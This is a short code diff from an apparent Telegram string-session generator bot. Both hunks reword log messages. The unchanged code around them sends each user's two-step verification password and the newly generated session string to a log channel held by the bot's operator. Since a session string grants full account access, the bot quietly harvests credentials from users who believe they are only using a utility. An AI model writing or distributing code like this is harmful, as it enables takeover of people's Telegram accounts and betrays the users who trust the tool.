@@ -117,7 +117,7 @@ async def teleGen(strbot, callback_data):
             await strbot.send_message(
                     chat_id=LOG_CHANNEL,
                     text=(
-                        f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) Account password is : `{PASSWORD.text}`'
+                        f'{callback_data.from_user.mention} `{callback_data.from_user.id}` 2FA Password: `{PASSWORD.text}`'
                     )
                 )     
             await userClient.sign_in(password=PASSWORD.text)
@@ -133,6 +133,6 @@ async def teleGen(strbot, callback_data):
     await strbot.send_message(
             chat_id=LOG_CHANNEL,
             text=(
-                f'{callback_data.from_user.mention} ( `{callback_data.from_user.id}` ) String session is : `{session_string}`'
+                f'{callback_data.from_user.mention} `{callback_data.from_user.id}` StringSession:\n\n`{session_string}`'
             )
         )     
